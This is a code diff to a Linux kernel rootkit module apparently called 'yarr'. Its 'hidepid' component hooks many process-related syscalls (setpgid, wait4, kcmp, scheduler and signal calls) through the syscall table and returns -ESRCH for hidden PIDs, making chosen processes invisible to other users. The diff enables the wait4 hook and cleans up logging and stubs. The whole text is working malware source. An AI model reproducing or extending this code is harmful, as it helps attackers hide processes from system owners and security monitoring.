@@ -96,7 +96,6 @@ static int __cmp_pid(pid_t *p1, pid_t *p2) {
  * rt_tgsigqueueinfo
  * waitid
  * wait4
- * waitpid (implemented, not used)
  * kcmp
  * sched_setscheduler
  * sched_setparam
@@ -113,12 +112,13 @@ static int __cmp_pid(pid_t *p1, pid_t *p2) {
  * migrate_pages
  *
  * We need to hook all of them to check if the pid passed is a hidden pid, in
- * that case we silently return -ESRCH as if a process with such a pid doesn't
- * exist.
+ * that case we return -ESRCH as if a process with such a pid doesn't exist.
  */
 
-// TODO: These are just skeletons, I need to go through all of them and check
-// proper parameters an act consequently.
+// TODO: Couple of things. I haven't tested all these functions and probably
+// will never do so expect problems. Also we can see a pattern in these
+// functions, it'd be great to create a macro that generates all the common
+// part, something similar to SYSCALL_DEFINEx() in the kernel.
 asmlinkage long __yarr__x64_sys_setpgid(const struct pt_regs *regs) {
     long (*__x64_sys_setpgid)(const struct pt_regs *);
     pid_t pid;
@@ -133,30 +133,11 @@ asmlinkage long __yarr__x64_sys_setpgid(const struct pt_regs *regs) {
     pid = regs->di;
     pgid = regs->si;
 
-    yarr_log("setpgid(%d, %d)", pid, pgid);
-
     // Tasks inside the hidden group can operate normally. Tasks outside don't
     // see the group.
     if (current->tgid != pgid && __pid_is_hidden(pgid)) {
         return -ESRCH;
     }
-
-//    // If current process is trying to change the PGID of another process.
-//    if (!__pid_is_self(pid)) {
-//        if (__pid_is_hidden(pid)) {
-//            return -ESRCH;
-//        }
-//
-//        // TODO: Not sure if the group leader is the task with PID == PGID
-//        // always or it can change. If so this is broken.
-//        // Check if the task that is group leader of PGID is a hidden task.
-//        // I won't let tasks enter the group of a hidden task.
-//        gl_pid = find_vpid(pgid);
-//        pgid = pid_vnr(gl_pid);
-//        if (__pid_is_hidden(pgid)) {
-//            return -ESRCH;
-//        }
-//    }
 
     __x64_sys_setpgid = __CAST_TO_SYSCALL(__orig_sct[__NR_setpgid]);
     return __x64_sys_setpgid(regs);
@@ -348,28 +329,6 @@ asmlinkage long __yarr__x64_sys_wait4(const struct pt_regs *regs) {
     __x64_sys_wait4 = __CAST_TO_SYSCALL(__orig_sct[__NR_wait4]);
     return __x64_sys_wait4(regs);
 }
-
-// sys_waitpid is implemented in kernel/exit.c, however it is never introduced
-// in the syscall table (not reachable by normal means) and it doesn't have a
-// __NR_waitpid number associated. I leave this stub here just for the sake of
-// being strict.
-//asmlinkage long __yarr__x64_sys_waitpid(const struct pt_regs *regs) {
-//    long (*__x64_sys_waitpid)(const struct pt_regs *);
-//    pid_t pid;
-//
-//    if (regs == NULL) {
-//        yarr_log("regs are NULL");
-//        return -1;
-//    }
-//
-//    pid = regs->di;
-//    if (!__pid_is_self(pid) && __pid_is_hidden(pid)) {
-//        return -ESRCH;
-//    }
-//
-//    __x64_sys_waitpid = __CAST_TO_SYSCALL(__orig_sct[__NR_waitpid]);
-//    return __x64_sys_waitpid(regs);
-//}
 
 asmlinkage long __yarr__x64_sys_kcmp(const struct pt_regs *regs) {
     long (*__x64_sys_kcmp)(const struct pt_regs *);
@@ -625,7 +584,7 @@ asmlinkage long __yarr__x64_sys_migrate_pages(const struct pt_regs *regs) {
     return __x64_sys_migrate_pages(regs);
 }
 
-//*****************************************************************************
+/*****************************************************************************/
 
 int init_hidepid(void) {
     if (__hidepid_initialized()) {
@@ -657,7 +616,7 @@ int stop_hidepid(void) {
 int hidepid_install_syscalls(void) {
     int err = 0;
     
-    err |= install_hook(__NR_setpgid, (unsigned long)__yarr__x64_sys_setpgid);
+    err = install_hook(__NR_setpgid, (unsigned long)__yarr__x64_sys_setpgid);
     err |= install_hook(__NR_getpgid, (unsigned long)__yarr__x64_sys_getpgid);
     err |= install_hook(__NR_getsid, (unsigned long)__yarr__x64_sys_getsid);
     err |= install_hook(__NR_prlimit64, (unsigned long)__yarr__x64_sys_prlimit64);
@@ -667,8 +626,7 @@ int hidepid_install_syscalls(void) {
     err |= install_hook(__NR_rt_sigqueueinfo, (unsigned long)__yarr__x64_sys_rt_sigqueueinfo);
     err |= install_hook(__NR_rt_tgsigqueueinfo, (unsigned long)__yarr__x64_sys_rt_tgsigqueueinfo);
     err |= install_hook(__NR_waitid, (unsigned long)__yarr__x64_sys_waitid);
-    //err |= install_hook(__NR_wait4, (unsigned long)__yarr__x64_sys_wait4);
-    //err |= install_hook(__NR_waitpid, (unsigned long)__yarr__x64_sys_waitpid);
+    err |= install_hook(__NR_wait4, (unsigned long)__yarr__x64_sys_wait4);
     err |= install_hook(__NR_kcmp, (unsigned long)__yarr__x64_sys_kcmp);
     err |= install_hook(__NR_sched_setscheduler, (unsigned long)__yarr__x64_sys_sched_setscheduler);
     err |= install_hook(__NR_sched_setparam, (unsigned long)__yarr__x64_sys_sched_setparam);
